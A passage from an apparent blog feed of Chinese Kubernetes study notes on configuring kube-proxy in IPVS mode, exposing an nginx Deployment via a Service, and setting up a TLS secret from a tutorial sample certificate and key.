html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html">cat &gt; /etc/sysconfig/modules/ipvs.modules &lt;<span class="hljs-tag">&lt;<span class="hljs-name">EOF</span></span><br><span class="hljs-tag">#!/<span class="hljs-attr">bin</span>/<span class="hljs-attr">bash</span></span><br><span class="hljs-tag"><span class="hljs-attr">ipvs_modules</span>=<span class="hljs-string">&quot;ip_vs ip_vs_lc ip_vs_wlc ip_vs_rr ip_vs_wrr ip_vs_lblc ip_vs_lblcr ip_vs_dh ip_vs_sh ip_vs_nq ip_vs_sed ip_vs_ftp nf_conntrack&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">for</span> <span class="hljs-attr">kernel_module</span> <span class="hljs-attr">in</span> \$&#123;<span class="hljs-attr">ipvs_modules</span>&#125;; </span><br><span class="hljs-tag"><span class="hljs-attr">do</span></span><br><span class="hljs-tag">/<span class="hljs-attr">sbin</span>/<span class="hljs-attr">modinfo</span> <span class="hljs-attr">-F</span> <span class="hljs-attr">filename</span> \$&#123;<span class="hljs-attr">kernel_module</span>&#125; &gt;</span> /dev/null 2&gt;&amp;1 <br>if [ $? -eq 0 ]; then<br>/sbin/modprobe \$&#123;kernel_module&#125; <br>fi<br>done <br>EOF<br> <br>chmod 755 /etc/sysconfig/modules/ipvs.modules &amp;&amp; \<br>bash /etc/sysconfig/modules/ipvs.modules &amp;&amp; \<br>lsmod | grep ip_vs<br><br><br></code></pre></td></tr></table></figure><h5 id="查看kube-proxy-运行情况"><a href="#查看kube-proxy-运行情况" class="headerlink" title="查看kube-proxy 运行情况"></a>查看kube-proxy 运行情况</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl -n kube-system get pod -o wide| grep proxy<br><br></code></pre></td></tr></table></figure><h3 id="更改名为kube-proxy的cm配置文件-修改模式为ipvs"><a href="#更改名为kube-proxy的cm配置文件-修改模式为ipvs" class="headerlink" title="更改名为kube-proxy的cm配置文件,修改模式为ipvs"></a>更改名为kube-proxy的cm配置文件,修改模式为ipvs</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl edit cm kube-proxy -n kube-system<br></code></pre></td></tr></table></figure><p><a href="/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110052857844.png" class="gallery-item"><img src="/2021/11/10/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110052857844.png"></a></p><h3 id="更新kube-proxy-pod"><a href="#更新kube-proxy-pod" class="headerlink" title="更新kube-proxy pod"></a>更新kube-proxy pod</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl get pod -n kube-system |grep kube-proxy | awk &#x27;&#123;system(&quot;kubectl delete pod &quot;$1&quot; -n kube-system&quot;)&#125;&#x27;<br><br></code></pre></td></tr></table></figure><p><a href="/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110052157056.png" class="gallery-item"><img src="/2021/11/10/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110052157056.png"></a></p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p><a href="/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110052644267.png" class="gallery-item"><img src="/2021/11/10/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110052644267.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Service 连接到应用</title>
      <link href="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/"/>
      <url>/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="在集群中暴露-Pod"><a href="#在集群中暴露-Pod" class="headerlink" title="在集群中暴露 Pod"></a>在集群中暴露 Pod<p>我们在之前的示例中已经做过，然而让我们以网络连接的视角再重做一遍。 创建一个 Nginx Pod，并且注意，它有一个容器端口的规范：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">my-nginx</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">my-nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">my-nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl get pods -l run=my-nginx -owide  # -l labels 标签，对应yaml　文件中的　run:  my-nginx<br></code></pre></td></tr></table></figure><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109103124996.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109103124996.png"></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl get pods -l run=my-nginx -o yaml | grep podIP<br></code></pre></td></tr></table></figure><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109104621425.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109104621425.png"></a></p><p>应该能够通过 ssh 登录到集群中的任何一个节点上，<br><font color="red" size="2">使用 curl 也能调通所有 IP 地址。</font> </p><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109105640957.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109105640957.png"></a></p><p>需要注意的是，容器不会使用该节点上的 80 端口，也不会使用任何特定的 NAT 规则去路由流量到 Pod 上。 这意味着可以在同一个节点上运行多个 Pod，使用相同的容器端口，并且可以从集群中任何其他的 Pod 或节点上使用 IP 的方式访问到它们。 像 Docker 一样，端口能够被发布到主机节点的接口上，但是出于网络模型的原因应该从根本上减少这种用法。<br><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109110410564.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109110410564.png"></a></p><h1 id="创建服务Service"><a href="#创建服务Service" class="headerlink" title="创建服务Service"></a>创建服务Service</h1><p><font color="green" size="2">服务的创建，在Pod的基础上又进行了一层封装。实现了对相同label pod 【提供了相同的功能】的负载均衡（通过porxy ,iptables,lvs ,或者userspace等），伴随着服务的创建，真正意思上实现了应用服务的高可用。原先对单个Pod Ip的访问，现在变成对Service创建后的虚拟集群IP ,CLUSTER IP ,或者域名【ExternalName】的访问  </font></p><h4 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h4><h5 id="命令行方式"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl expose deployment/my-nginx<br>service/my-nginx exposed<br><br></code></pre></td></tr></table></figure><h5 id="资源清单方式"><a href="#资源清单方式" class="headerlink" title="资源清单方式"></a>资源清单方式</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">run:</span> <span class="hljs-string">my-nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>    <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">run:</span> <span class="hljs-string">my-nginx</span><br><br><br></code></pre></td></tr></table></figure><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109113807059.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109113807059.png"></a></p><p>正如前面所提到的，一个 Service 由一组 backend Pod 组成。这些 Pod 通过 endpoints 暴露出来。 Service Selector 将持续评估，结果被 POST 到一个名称为 my-nginx 的 Endpoint 对象上。 当 Pod 终止后，它会自动从 Endpoint 中移除，新的能够匹配上 Service Selector 的 Pod 将自动地被添加到 Endpoint 中。 检查该 Endpoint，注意到 IP 地址与在第一步创建的 Pod 是相同的。<br><font color="red" size="2">经过测试，删除Pod后，由deployment【RC】 创建的新pod ，其Endpoint IP并非与原相同。这一点与官网描述有出入。<a href="https://kubernetes.io/zh/docs/concepts/services-networking/connect-applications-service/">https://kubernetes.io/zh/docs/concepts/services-networking/connect-applications-service/</a> </font></p><h1 id="访问Service"><a href="#访问Service" class="headerlink" title="访问Service"></a>访问Service</h1><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109013831062.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109013831062.png"></a></p><p>正确的做法是，我们杀掉 2 个 Pod，等待 Deployment 去创建它们。 这次 Service 会 先于 副本存在。这将实现调度器级别的 Service，能够使 Pod 分散创建（假定所有的 Node 都具有同样的容量），以及正确的环境变量：<br><font color="red" size="2">测试，单个NODE DOWN导致所有POD无法起来,间隔了一会，相应的Pod才在K8S2上起来，K8s3上的<br>pod处于 Temrinating 状态 </font></p><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109032952158.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109032952158.png"></a></p><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109032501413.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109032501413.png"></a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl scale deployment my-nginx --replicas=0; kubectl scale deployment my-nginx --replicas=2;<br><br>kubectl get pods -l run=my-nginx -o wide<br></code></pre></td></tr></table></figure><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109020514540.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109020514540.png"></a></p><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">kubectl get services kube-dns --namespace=kube-system<br>NAME       TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)         AGE<br>kube-dns   ClusterIP   10.0.0.10    <span class="hljs-tag">&lt;<span class="hljs-name">none</span>&gt;</span>        53/UDP,53/TCP   8m<br></code></pre></td></tr></table></figure><p><font color="red" size="2">在容器内部做服务域名解析测试，测试结果失败</font></p><h1 id="保护Service-相应测试设计到etc存储等，-configmap-等存粗学习完成后再进一步测试。"><a href="#保护Service-相应测试设计到etc存储等，-configmap-等存粗学习完成后再进一步测试。" class="headerlink" title="保护Service [相应测试设计到etc存储等， configmap 等存粗学习完成后再进一步测试。]"></a>保护Service [相应测试设计到etc存储等， configmap 等存粗学习完成后再进一步测试。]</h1><p><a href="/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109035739649.png" class="gallery-item"><img src="/2021/11/09/%E4%BD%BF%E7%94%A8Service%E9%93%BE%E6%8E%A5%E5%88%B0%E5%BA%94%E7%94%A8/20211109035739649.png"></a></p><ul><li>  用于 HTTPS 的自签名证书（除非已经有了一个识别身份的证书）</li><li>  使用证书配置的 Nginx 服务器</li><li>  使证书可以访问 Pod 的 <a href="https://kubernetes.io/zh/docs/concepts/configuration/secret/">Secret</a></li></ul><h4 id="使用go-和make-工具"><a href="#使用go-和make-工具" class="headerlink" title="使用go 和make 工具"></a>使用go 和make 工具</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">make keys KEY=/tmp/nginx.key CERT=/tmp/nginx.crt<br>kubectl create secret tls nginxsecret --key /tmp/nginx.key --cert /tmp/nginx.crt<br>secret/nginxsecret created<br>kubectl get secrets<br><br></code></pre></td></tr></table></figure><h4 id="运行make方式"><a href="#运行make方式" class="headerlink" title="运行make方式"></a>运行make方式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Create a public private key pair</span><br>openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /tmp/nginx.key -out /d/tmp/nginx.crt -subj &quot;/CN=my-nginx/O=my-nginx&quot;<br><span class="hljs-meta">#</span><span class="bash"> Convert the keys to base64 encoding</span><br>cat /tmp/nginx.crt | base64<br>cat /tmp/nginx.key | base64<br><br></code></pre></td></tr></table></figure><p>使用前面命令的输出来创建 yaml 文件，如下所示。 base64 编码的值应全部放在一行上。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">&quot;v1&quot;</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">&quot;Secret&quot;</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;nginxsecret&quot;</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">&quot;default&quot;</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">kubernetes.io/tls</span>  <br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">tls.crt:</span> <span class="hljs-string">&quot;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURIekNDQWdlZ0F3SUJBZ0lKQUp5M3lQK0pzMlpJTUEwR0NTcUdTSWIzRFFFQkJRVUFNQ1l4RVRBUEJnTlYKQkFNVENHNW5hVzU0YzNaak1SRXdEd1lEVlFRS0V3aHVaMmx1ZUhOMll6QWVGdzB4TnpFd01qWXdOekEzTVRKYQpGdzB4T0RFd01qWXdOekEzTVRKYU1DWXhFVEFQQmdOVkJBTVRDRzVuYVc1NGMzWmpNUkV3RHdZRFZRUUtFd2h1CloybHVlSE4yWXpDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBSjFxSU1SOVdWM0IKMlZIQlRMRmtobDRONXljMEJxYUhIQktMSnJMcy8vdzZhU3hRS29GbHlJSU94NGUrMlN5ajBFcndCLzlYTnBwbQppeW1CL3JkRldkOXg5UWhBQUxCZkVaTmNiV3NsTVFVcnhBZW50VWt1dk1vLzgvMHRpbGhjc3paenJEYVJ4NEo5Ci82UVRtVVI3a0ZTWUpOWTVQZkR3cGc3dlVvaDZmZ1Voam92VG42eHNVR0M2QURVODBpNXFlZWhNeVI1N2lmU2YKNHZpaXdIY3hnL3lZR1JBRS9mRTRqakxCdmdONjc2SU90S01rZXV3R0ljNDFhd05tNnNTSzRqYUNGeGpYSnZaZQp2by9kTlEybHhHWCtKT2l3SEhXbXNhdGp4WTRaNVk3R1ZoK0QrWnYvcW1mMFgvbVY0Rmo1NzV3ajFMWVBocWtsCmdhSXZYRyt4U1FVQ0F3RUFBYU5RTUU0d0hRWURWUjBPQkJZRUZPNG9OWkI3YXc1OUlsYkROMzhIYkduYnhFVjcKTUI4R0ExVWRJd1FZTUJhQUZPNG9OWkI3YXc1OUlsYkROMzhIYkduYnhFVjdNQXdHQTFVZEV3UUZNQU1CQWY4dwpEUVlKS29aSWh2Y05BUUVGQlFBRGdnRUJBRVhTMW9FU0lFaXdyMDhWcVA0K2NwTHI3TW5FMTducDBvMm14alFvCjRGb0RvRjdRZnZqeE04Tzd2TjB0clcxb2pGSW0vWDE4ZnZaL3k4ZzVaWG40Vm8zc3hKVmRBcStNZC9jTStzUGEKNmJjTkNUekZqeFpUV0UrKzE5NS9zb2dmOUZ3VDVDK3U2Q3B5N0M3MTZvUXRUakViV05VdEt4cXI0Nk1OZWNCMApwRFhWZmdWQTRadkR4NFo3S2RiZDY5eXM3OVFHYmg5ZW1PZ05NZFlsSUswSGt0ejF5WU4vbVpmK3FqTkJqbWZjCkNnMnlwbGQ0Wi8rUUNQZjl3SkoybFIrY2FnT0R4elBWcGxNSEcybzgvTHFDdnh6elZPUDUxeXdLZEtxaUMwSVEKQ0I5T2wwWW5scE9UNEh1b2hSUzBPOStlMm9KdFZsNUIyczRpbDlhZ3RTVXFxUlU9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K&quot;</span><br>  <span class="hljs-attr">tls.key:</span> <span class="hljs-string">&quot;LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2UUlCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktjd2dnU2pBZ0VBQW9JQkFRQ2RhaURFZlZsZHdkbFIKd1V5eFpJWmVEZWNuTkFhbWh4d1NpeWF5N1AvOE9ta3NVQ3FCWmNpQ0RzZUh2dGtzbzlCSzhBZi9WemFhWm9zcApnZjYzUlZuZmNmVUlRQUN3WHhHVFhHMXJKVEVGSzhRSHA3VkpMcnpLUC9QOUxZcFlYTE0yYzZ3MmtjZUNmZitrCkU1bEVlNUJVbUNUV09UM3c4S1lPNzFLSWVuNEZJWTZMMDUrc2JGQmd1Z0ExUE5JdWFubm9UTWtlZTRuMG4rTDQKb3NCM01ZUDhtQmtRQlAzeE9JNHl3YjREZXUraURyU2pKSHJzQmlIT05Xc0RadXJFaXVJMmdoY1kxeWIyWHI2UAozVFVOcGNSbC9pVG9zQngxcHJHclk4V09HZVdPeGxZZmcvbWIvNnBuOUYvNWxlQlkrZStjSTlTMkQ0YXBKWUdpCkwxeHZzVWtGQWdNQkFBRUNnZ0VBZFhCK0xkbk8ySElOTGo5bWRsb25IUGlHWWVzZ294RGQwci9hQ1Zkank4dlEKTjIwL3FQWkUxek1yall6Ry9kVGhTMmMwc0QxaTBXSjdwR1lGb0xtdXlWTjltY0FXUTM5SjM0VHZaU2FFSWZWNgo5TE1jUHhNTmFsNjRLMFRVbUFQZytGam9QSFlhUUxLOERLOUtnNXNrSE5pOWNzMlY5ckd6VWlVZWtBL0RBUlBTClI3L2ZjUFBacDRuRWVBZmI3WTk1R1llb1p5V21SU3VKdlNyblBESGtUdW1vVlVWdkxMRHRzaG9reUxiTWVtN3oKMmJzVmpwSW1GTHJqbGtmQXlpNHg0WjJrV3YyMFRrdWtsZU1jaVlMbjk4QWxiRi9DSmRLM3QraTRoMTVlR2ZQegpoTnh3bk9QdlVTaDR2Q0o3c2Q5TmtEUGJvS2JneVVHOXBYamZhRGR2UVFLQmdRRFFLM01nUkhkQ1pKNVFqZWFKClFGdXF4cHdnNzhZTjQyL1NwenlUYmtGcVFoQWtyczJxWGx1MDZBRzhrZzIzQkswaHkzaE9zSGgxcXRVK3NHZVAKOWRERHBsUWV0ODZsY2FlR3hoc0V0L1R6cEdtNGFKSm5oNzVVaTVGZk9QTDhPTm1FZ3MxMVRhUldhNzZxelRyMgphRlpjQ2pWV1g0YnRSTHVwSkgrMjZnY0FhUUtCZ1FEQmxVSUUzTnNVOFBBZEYvL25sQVB5VWs1T3lDdWc3dmVyClUycXlrdXFzYnBkSi9hODViT1JhM05IVmpVM25uRGpHVHBWaE9JeXg5TEFrc2RwZEFjVmxvcG9HODhXYk9lMTAKMUdqbnkySmdDK3JVWUZiRGtpUGx1K09IYnRnOXFYcGJMSHBzUVpsMGhucDBYSFNYVm9CMUliQndnMGEyOFVadApCbFBtWmc2d1BRS0JnRHVIUVV2SDZHYTNDVUsxNFdmOFhIcFFnMU16M2VvWTBPQm5iSDRvZUZKZmcraEppSXlnCm9RN3hqWldVR3BIc3AyblRtcHErQWlSNzdyRVhsdlhtOElVU2FsbkNiRGlKY01Pc29RdFBZNS9NczJMRm5LQTQKaENmL0pWb2FtZm1nZEN0ZGtFMXNINE9MR2lJVHdEbTRpb0dWZGIwMllnbzFyb2htNUpLMUI3MkpBb0dBUW01UQpHNDhXOTVhL0w1eSt5dCsyZ3YvUHM2VnBvMjZlTzRNQ3lJazJVem9ZWE9IYnNkODJkaC8xT2sybGdHZlI2K3VuCnc1YytZUXRSTHlhQmd3MUtpbGhFZDBKTWU3cGpUSVpnQWJ0LzVPbnlDak9OVXN2aDJjS2lrQ1Z2dTZsZlBjNkQKckliT2ZIaHhxV0RZK2Q1TGN1YSt2NzJ0RkxhenJsSlBsRzlOZHhrQ2dZRUF5elIzT3UyMDNRVVV6bUlCRkwzZAp4Wm5XZ0JLSEo3TnNxcGFWb2RjL0d5aGVycjFDZzE2MmJaSjJDV2RsZkI0VEdtUjZZdmxTZEFOOFRwUWhFbUtKCnFBLzVzdHdxNWd0WGVLOVJmMWxXK29xNThRNTBxMmk1NVdUTThoSDZhTjlaMTltZ0FGdE5VdGNqQUx2dFYxdEYKWSs4WFJkSHJaRnBIWll2NWkwVW1VbGc9Ci0tLS0tRU5EIFBSSVZBVEUgS0VZLS0tLS0K&quot;</span><br><br></code></pre></td></tr></table></figure><p>现在使用文件创建 Secrets：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">kubectl</span> <span class="hljs-string">apply</span> <span class="hljs-string">-f</span> <span class="hljs-string">nginxsecrets.yaml</span><br><span class="hljs-string">kubectl</span> <span class="hljs-string">get</span> <span class="hljs-string">secrets</span><br><br></code></pre></td></tr></table></figure><p>现在修改 nginx 副本，启动一个使用在秘钥中的证书的 HTTPS 服务器和 Service，暴露端口（80 和 443）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">run:</span> <span class="hljs-string">my-nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">NodePort</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">80</span><br>    <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">http</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">443</span><br>    <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">https</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">run:</span> <span class="hljs-string">my-nginx</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span 